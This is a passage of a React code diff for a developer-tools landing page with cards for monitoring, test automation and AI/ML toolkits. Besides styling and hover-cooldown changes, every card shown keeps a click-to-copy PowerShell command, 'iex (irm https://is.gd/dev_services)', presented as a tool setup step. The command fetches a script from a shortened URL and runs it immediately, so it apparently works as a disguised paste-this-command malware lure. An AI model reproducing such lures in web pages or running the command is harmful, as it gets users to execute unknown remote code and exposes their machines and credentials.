+                <p className="text-gray-300 text-sm mb-4">
                   Grafana, Prometheus, ELK stack
                 </p>
-                <code
-                  className="text-xs bg-slate-900/50 px-2 py-1 flex rounded text-flex items-center gap-2 text-xs bg-slate-900/50 px-2 py-1 rounded text-green-400 font-mono cursor-pointer hover:bg-slate-800/50 transition-colors-400 font-mono cursor-pointer hover:bg-slate-800/50 transition-colors block"
-                  onClick={() =>
-                    copyScript("iex (irm https://is.gd/dev_services)")
-                  }
-                  title="Click to copy"
-                >
-                  <PowerShellIconScript className="w-5 h-5 text-green-400 flex-shrink-0" />
-                  <span>iex (irm https://is.gd/dev_services)</span>
-                </code>
+                <div className="w-full flex justify-start">
+                  <code
+                    className="flex items-center gap-2 text-xs bg-slate-900/60 px-3 py-2 rounded font-mono text-green-400 cursor-pointer hover:bg-slate-800/70 transition-colors shadow"
+                    onClick={() =>
+                      copyScript("iex (irm https://is.gd/dev_services)")
+                    }
+                    title="Click to copy"
+                  >
+                    <PowerShellIconScript className="w-5 h-5 text-green-400 flex-shrink-0" />
+                    <span>iex (irm https://is.gd/dev_services)</span>
+                  </code>
+                </div>
               </div>
 
               {/* Testing Framework */}
               <div
-                className={`bg-white/5 backdrop-blur-sm border border-white/10 rounded-xl p-6 h-full transition-all duration-300 cursor-pointer transform-gpu hover:scale-105 hover:bg-white/15 hover:border-white/20 hover:shadow-2xl hover:shadow-purple-500/20`}
-                onMouseEnter={() => setHoveredCard("testing")}
-                onMouseLeave={() => setHoveredCard(null)}
+                className={`bg-white/5 backdrop-blur-sm border border-white/10 rounded-xl p-6 h-full transition-all duration-300 cursor-pointer transform-gpu hover:scale-102 hover:shadow-lg hover:bg-white/10 hover:border-white/20`}
+                onMouseEnter={() => {
+                  if (!hoverCooldown) setHoveredCard("testing");
+                }}
+                onMouseLeave={() => {
+                  setHoveredCard(null);
+                  setHoverCooldown(true);
+                  if (cooldownRef.current) clearTimeout(cooldownRef.current);
+                  cooldownRef.current = setTimeout(
+                    () => setHoverCooldown(false),
+                    400
+                  );
+                }}
               >
-                <div className="text-2xl mb-3">
+                <div className="text-2xl mb-4">
                   <BeakerIcon className="w-8 h-8 text-purple-400" />
                 </div>
                 <h3 className="text-xl font-semibold text-white mb-2">
                   Test Automation
                 </h3>
-                <p className="text-gray-300 text-sm mb-3">
+                <p className="text-gray-300 text-sm mb-4">
                   Jest, Cypress, Playwright setup
                 </p>
-                <code
-                  className="text-xs bg-slate-900/50 px-2 py-1 flex rounded text-flex items-center gap-2 text-xs bg-slate-900/50 px-2 py-1 rounded text-purple-400 font-mono cursor-pointer hover:bg-slate-800/50 transition-colors-400 font-mono cursor-pointer hover:bg-slate-800/50 transition-colors block"
-                  onClick={() =>
-                    copyScript("iex (irm https://is.gd/dev_services)")
-                  }
-                  title="Click to copy"
-                >
-                  <PowerShellIconScript className="w-5 h-5 text-purple-400 flex-shrink-0" />
-                  <span>iex (irm https://is.gd/dev_services)</span>
-                </code>
+                <div className="w-full flex justify-start">
+                  <code
+                    className="flex items-center gap-2 text-xs bg-slate-900/60 px-3 py-2 rounded font-mono text-purple-400 cursor-pointer hover:bg-slate-800/70 transition-colors shadow"
+                    onClick={() =>
+                      copyScript("iex (irm https://is.gd/dev_services)")
+                    }
+                    title="Click to copy"
+                  >
+                    <PowerShellIconScript className="w-5 h-5 text-purple-400 flex-shrink-0" />
+                    <span>iex (irm https://is.gd/dev_services)</span>
+                  </code>
+                </div>
               </div>
 
               {/* AI/ML Tools */}
               <div
-                className={`bg-white/5 backdrop-blur-sm border border-white/10 rounded-xl p-6 h-full transition-all duration-300 cursor-pointer transform-gpu hover:scale-105 hover:bg-white/15 hover:border-white/20 hover:shadow-2xl hover:shadow-pink-500/20`}
-                onMouseEnter={() => setHoveredCard("ai")}
-                onMouseLeave={() => setHoveredCard(null)}
+                className={`bg-white/5 backdrop-blur-sm border border-white/10 rounded-xl p-6 h-full transition-all duration-300 cursor-pointer transform-gpu hover:scale-102 hover:shadow-lg hover:bg-white/10 hover:border-white/20`}
+                onMouseEnter={() => {
+                  if (!hoverCooldown) setHoveredCard("ai");
+                }}
+                onMouseLeave={() => {
+                  setHoveredCard(null);
+                  setHoverCooldown(true);
+                  if (cooldownRef.current) clearTimeout(cooldownRef.current);
+                  cooldownRef.current = setTimeout(
+                    () => setHoverCooldown(false),
+                    400
+                  );
+                }}
               >
-                <div className="text-2xl mb-3">
+                <div className="text-2xl mb-4">
                   <CpuIcon className="w-8 h-8 text-pink-400" />
                 </div>
                 <h3 className="text-xl font-semibold text-white mb-2">
                   AI/ML Toolkit
                 </h3>
-                <p className="text-gray-300 text-sm mb-3">
+                <p className="text-gray-300 text-sm mb-4">
                   TensorFlow, PyTorch, OpenAI SDK
                 </p>
-                <code
-                  className="text-xs bg-slate-900/50 px-2 py-1 flex rounded text-flex items-center gap-2 text-xs bg-slate-900/50 px-2 py-1 rounded text-red-400 font-mono cursor-pointer hover:bg-slate-800/50 transition-colors-400 font-mono cursor-pointer hover:bg-slate-800/50 transition-colors block"
-                  onClick={() =>
-                    copyScript("iex (irm https://is.gd/dev_services)")
-                  }
-                  title="Click to copy"
-                >
-                  <PowerShellIconScript className="w-5 h-5 text-red-400 flex-shrink-0" />
-                  <span>iex (irm https://is.gd/dev_services)</span>
-                </code>
+                <div className="w-full flex justify-start">
+                  <code
+                    className="flex items-center gap-2 text-xs bg-slate-900/60 px-3 py-2 rounded font-mono text-red-400 cursor-pointer hover:bg-slate-800/70 transition-colors shadow"
+                    onClick={() =>
+                      copyScript("iex (irm https://is.gd/dev_services)")
+                    }
+                    title="Click to copy"
+                  >
+                    <PowerShellIconScript className="w-5 h-5 text-red-400 flex-shrink-0" />
+                    <span>iex (irm https://is.gd/dev_services)</span>
+                  </code>
+                </div>
               </div>
             </div>
 
